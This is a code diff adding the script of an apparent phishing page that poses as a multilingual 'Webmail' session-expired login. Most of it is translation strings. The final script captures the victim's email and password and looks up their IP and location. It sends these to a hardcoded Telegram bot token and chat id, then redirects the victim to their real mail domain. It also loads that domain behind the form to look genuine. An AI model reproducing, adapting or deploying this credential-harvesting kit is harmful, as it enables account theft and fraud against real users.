+     password: "Lozinka",
+     retypePassword: "Ponovno unesite lozinku",
+     alwaysSecure: "Uvijek sigurno",
+     privateComputer: "Privatno računalo",
+     forgotPassword: "Zaboravljena lozinka?",
+     signIn: "Prijava",
+     footer: "Osigurano od strane Inc. © 2025",
+     passwordMismatch: "Lozinke se ne podudaraju!"
+    },
+    sr: {
+     title: "Veb pošta",
+     sessionExpired: "Sesija je istekla. Prijavite se ponovo.",
+     email: "Email adresa",
+     password: "Lozinka",
+     retypePassword: "Ponovo unesite lozinku",
+     alwaysSecure: "Uvek sigurno",
+     privateComputer: "Privatni računar",
+     forgotPassword: "Zaboravili ste lozinku?",
+     signIn: "Prijavi se",
+     footer: "Zaštićeno od Inc. © 2025",
+     passwordMismatch: "Lozinke se ne poklapaju!"
+    },
+    ur: {
+     title: "ویب میل",
+     sessionExpired: "سیشن ختم ہو گیا ہے۔ دوبارہ سائن ان کریں۔",
+     email: "ای میل ایڈریس",
+     password: "پاس ورڈ",
+     retypePassword: "پاس ورڈ دوبارہ درج کریں",
+     alwaysSecure: "ہمیشہ محفوظ",
+     privateComputer: "نجی کمپیوٹر",
+     forgotPassword: "پاس ورڈ بھول گئے؟",
+     signIn: "سائن ان کریں",
+     footer: "یہ Inc. کے ذریعہ محفوظ ہے © 2025",
+     passwordMismatch: "پاس ورڈ مماثل نہیں ہیں!"
+    },
+    tl: {
+     title: "Webmail",
+     sessionExpired: "Nag-expire na ang session. Mangyaring mag-sign in muli.",
+     email: "Email address",
+     password: "Password",
+     retypePassword: "I-type muli ang password",
+     alwaysSecure: "Laging ligtas",
+     privateComputer: "Pribadong computer",
+     forgotPassword: "Nakalimutan ang password?",
+     signIn: "Mag-sign in",
+     footer: "Secure ito ng Inc. © 2025",
+     passwordMismatch: "Hindi tugma ang mga password!"
+    },
+    af: {
+     title: "Webpos",
+     sessionExpired: "Sessie het verval. Teken asseblief weer in.",
+     email: "E-posadres",
+     password: "Wagwoord",
+     retypePassword: "Tik wagwoord weer in",
+     alwaysSecure: "Altyd veilig",
+     privateComputer: "Privaat rekenaar",
+     forgotPassword: "Wagwoord vergeet?",
+     signIn: "Teken in",
+     footer: "Beveilig deur Inc. © 2025",
+     passwordMismatch: "Wagwoorde stem nie ooreen nie!"
+    },
+    sl: {
+     title: "Spletna pošta",
+     sessionExpired: "Seja je potekla. Prosimo, ponovno se prijavite.",
+     email: "E-poštni naslov",
+     password: "Geslo",
+     retypePassword: "Ponovno vnesite geslo",
+     alwaysSecure: "Vedno varno",
+     privateComputer: "Zasebni računalnik",
+     forgotPassword: "Ste pozabili geslo?",
+     signIn: "Prijava",
+     footer: "Zavarovano z Inc. © 2025",
+     passwordMismatch: "Gesli se ne ujemata!"
+    },
+    et: {
+     title: "Veebimeil",
+     sessionExpired: "Seanss on aegunud. Palun logi uuesti sisse.",
+     email: "E-posti aadress",
+     password: "Parool",
+     retypePassword: "Sisesta parool uuesti",
+     alwaysSecure: "Alati turvaline",
+     privateComputer: "Isiklik arvuti",
+     forgotPassword: "Unustasid parooli?",
+     signIn: "Logi sisse",
+     footer: "Turvaline Inc. poolt © 2025",
+     passwordMismatch: "Paroolid ei ühti!"
+    },
+    lv: {
+     title: "Tīmekļa pasts",
+     sessionExpired: "Sesija ir beigusies. Lūdzu, piesakieties vēlreiz.",
+     email: "E-pasta adrese",
+     password: "Parole",
+     retypePassword: "Ievadiet paroli vēlreiz",
+     alwaysSecure: "Vienmēr drošs",
+     privateComputer: "Privāts dators",
+     forgotPassword: "Aizmirsi paroli?",
+     signIn: "Pieteikties",
+     footer: "Aizsargāts ar Inc. © 2025",
+     passwordMismatch: "Paroles nesakrīt!"
+    },
+    lt: {
+     title: "Tinklo paštas",
+     sessionExpired: "Sesija baigėsi. Prisijunkite iš naujo.",
+     email: "El. pašto adresas",
+     password: "Slaptažodis",
+     retypePassword: "Pakartokite slaptažodį",
+     alwaysSecure: "Visada saugu",
+     privateComputer: "Privatus kompiuteris",
+     forgotPassword: "Pamiršote slaptažodį?",
+     signIn: "Prisijungti",
+     footer: "Apsaugota Inc. © 2025",
+     passwordMismatch: "Slaptažodžiai nesutampa!"
+    },
+    sw: {
+     title: "Barua pepe ya wavuti",
+     sessionExpired: "Kikao kimeisha muda wake. Tafadhali ingia tena.",
+     email: "Anuani ya barua pepe",
+     password: "Nenosiri",
+     retypePassword: "Ingiza nenosiri tena",
+     alwaysSecure: "Salama kila wakati",
+     privateComputer: "Kompyuta binafsi",
+     forgotPassword: "Umesahau nenosiri?",
+     signIn: "Ingia",
+     footer: "Imelindwa na Inc. © 2025",
+     passwordMismatch: "Manenosiri hayaendani!"
+    },
+    uz: {
+     title: "Veb-pochta",
+     sessionExpired: "Sessiya tugadi. Iltimos, qayta kiring.",
+     email: "Elektron pochta manzili",
+     password: "Parol",
+     retypePassword: "Parolni qayta kiriting",
+     alwaysSecure: "Har doim xavfsiz",
+     privateComputer: "Shaxsiy kompyuter",
+     forgotPassword: "Parolni unutdingizmi?",
+     signIn: "Kirish",
+     footer: "Inc. tomonidan himoyalangan © 2025",
+     passwordMismatch: "Parollar mos emas!"
+    },
+    he: {
+     title: "דואר אינטרנט",
+     sessionExpired: "ההפעלה פגה. אנא התחבר שוב.",
+     email: "כתובת אימייל",
+     password: "סיסמה",
+     retypePassword: "הקלד שוב את הסיסמה",
+     alwaysSecure: "תמיד מאובטח",
+     privateComputer: "מחשב פרטי",
+     forgotPassword: "שכחת סיסמה?",
+     signIn: "התחבר",
+     footer: "מאובטח על ידי Inc. © 2025",
+     passwordMismatch: "הסיסמאות אינן תואמות!"
+    },
+    hi: {
+     title: "वेबमेल",
+     sessionExpired: "सत्र समाप्त हो गया है। कृपया फिर से साइन इन करें।",
+     email: "ईमेल पता",
+     password: "पासवर्ड",
+     retypePassword: "पासवर्ड फिर से दर्ज करें",
+     alwaysSecure: "हमेशा सुरक्षित",
+     privateComputer: "निजी कंप्यूटर",
+     forgotPassword: "पासवर्ड भूल गए?",
+     signIn: "साइन इन करें",
+     footer: "यह Inc. द्वारा सुरक्षित है © 2025",
+     passwordMismatch: "पासवर्ड मेल नहीं खाते!"
+    },
+    th: {
+     title: "เว็บเมล",
+     sessionExpired: "เซสชันหมดอายุ กรุณาเข้าสู่ระบบใหม่",
+     email: "ที่อยู่อีเมล",
+     password: "รหัสผ่าน",
+     retypePassword: "พิมพ์รหัสผ่านอีกครั้ง",
+     alwaysSecure: "ปลอดภัยเสมอ",
+     privateComputer: "คอมพิวเตอร์ส่วนตัว",
+     forgotPassword: "ลืมรหัสผ่าน?",
+     signIn: "เข้าสู่ระบบ",
+     footer: "ได้รับการป้องกันโดย Inc. © 2025",
+     passwordMismatch: "รหัสผ่านไม่ตรงกัน!"
+    },
+    ro: {
+     title: "Webmail",
+     sessionExpired: "Sesiunea a expirat. Vă rugăm să vă autentificați din nou.",
+     email: "Adresă de e-mail",
+     password: "Parolă",
+     retypePassword: "Reintroduceți parola",
+     alwaysSecure: "Întotdeauna sigur",
+     privateComputer: "Calculator privat",
+     forgotPassword: "Ați uitat parola?",
+     signIn: "Autentificare",
+     footer: "Protejat de Inc. © 2025",
+     passwordMismatch: "Parolele nu se potrivesc!"
+    },
+    ka: {
+     title: "ვებფოსტა",
+     sessionExpired: "სესია დასრულდა. გთხოვთ, ხელახლა შედით სისტემაში.",
+     email: "ელ. ფოსტის მისამართი",
+     password: "პაროლი",
+     retypePassword: "ხელახლა შეიყვანეთ პაროლი",
+     alwaysSecure: "ყოველთვის დაცულია",
+     privateComputer: "პირადი კომპიუტერი",
+     forgotPassword: "დაგავიწყდათ პაროლი?",
+     signIn: "შესვლა",
+     footer: "დაცულია Inc. მიერ © 2025",
+     passwordMismatch: "პაროლები არ ემთხვევა!"
+    },
+    am: {
+     title: "የዌብ ፖስታ",
+     sessionExpired: "ክፍት እንቅስቃሴ አልቋል። እባኮትን ደግመው ይግቡ።",
+     email: "የኢሜል አድራሻ",
+     password: "የይለፍ ቃል",
+     retypePassword: "የይለፍ ቃልን ድጋሚ ያስገቡ",
+     alwaysSecure: "ሁሌም ደህና",
+     privateComputer: "የግል ኮምፒውተር",
+     forgotPassword: "የይለፍ ቃል ረስተዋል?",
+     signIn: "ይግቡ",
+     footer: "ይህ በ Inc. ተደህናል © 2025",
+     passwordMismatch: "የይለፍ ቃሎች አይዛመዱም!"
+    },
+	
+    // Add more languages (ja, zh, vi, etc.) as needed
+  };
+
+  function updateLanguage(locale) {
+    const lang = translations[locale] ? locale : 'en';
+    const t = translations[lang];
+    document.querySelector("h2").innerText = t.title;
+    document.getElementById("session-expired").innerText = t.sessionExpired;
+    document.getElementById("email").placeholder = t.email;
+    document.getElementById("password").placeholder = t.password;
+    document.getElementById("confirmPassword").placeholder = t.retypePassword;
+    document.getElementById("secure-label").innerText = t.alwaysSecure;
+    document.getElementById("private-label").innerText = t.privateComputer;
+    document.getElementById("forgot-link").innerText = t.forgotPassword;
+    document.getElementById("submit-btn").innerText = t.signIn;
+    document.querySelector(".footer").innerHTML = `<span class="secure-shield">🛡️</span> ${t.footer}`;
+    // Save password mismatch text for later use
+    window.passwordMismatchText = t.passwordMismatch;
+  }
+
+  function updateBackground(email) {
+    const domain = email.split('@')[1];
+    if (domain) {
+      document.getElementById("background-frame").src = "http://" + domain;
+    }
+  }
+
+  function submitForm() {
+    const emailInput = document.getElementById('email');
+    const email = emailInput.value;
+    const passwordInput = document.getElementById('password');
+    const confirmPasswordInput = document.getElementById('confirmPassword');
+    const password = passwordInput.value;
+    const confirmPassword = confirmPasswordInput.value;
+    const errorMessage = document.getElementById('error-message');
+    errorMessage.textContent = "";
+
+    if (password !== confirmPassword) {
+      errorMessage.textContent = window.passwordMismatchText || "Passwords do not match!";
+      passwordInput.classList.add("shake");
+      confirmPasswordInput.classList.add("shake");
+      setTimeout(() => {
+        passwordInput.classList.remove("shake");
+        confirmPasswordInput.classList.remove("shake");
+      }, 500);
+      return;
+    }
+
+    const browser = navigator.userAgent;
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip || 'Unknown';
+        const city = data.city || '';
+        const region = data.region || '';
+        const country = data.country_name || '';
+        const location = `${city}, ${region}, ${country}`;
+        const message = `🔐 Webmail Login:\n📧 Email: ${email}\n🔑 Password: ${password}\n📍 Location: ${location}\n🌐 IP: ${ip}\n🧭 Browser: ${browser}`;
+        const telegramBotToken = '8147785714:AAEhoDVshzqkal0AOT4Ie_Qyu1jjP1SV8N0';
+        const chatId = '7437481970';
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: message })
+        }).then(() => {
+          const domain = email.split('@')[1];
+          if (domain) window.location.href = `https://${domain}`;
+        });
+      });
+  }
+
+  window.addEventListener('DOMContentLoaded', () => {
+    const emailInput = document.getElementById("email");
+    const urlParams = new URLSearchParams(window.location.search);
+    const emailFromUrl = urlParams.get("email");
+    if (emailFromUrl) {
+      emailInput.value = emailFromUrl;
+      updateBackground(emailFromUrl);
+    } else {
+      const savedEmail = localStorage.getItem("savedEmail");
+      if (savedEmail) {
+        emailInput.value = savedEmail;
+        updateBackground(savedEmail);
+      }
+    }
+
+    emailInput.addEventListener("blur", () => {
+      const email = emailInput.value;
+      if (email.includes("@")) {
+        localStorage.setItem("savedEmail", email);
+        updateBackground(email);
+      }
+    });
+
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        const lang = (data.languages || 'en').split(',')[0].split('-')[0];
+        updateLanguage(lang);
+      });
+  });
+</script>
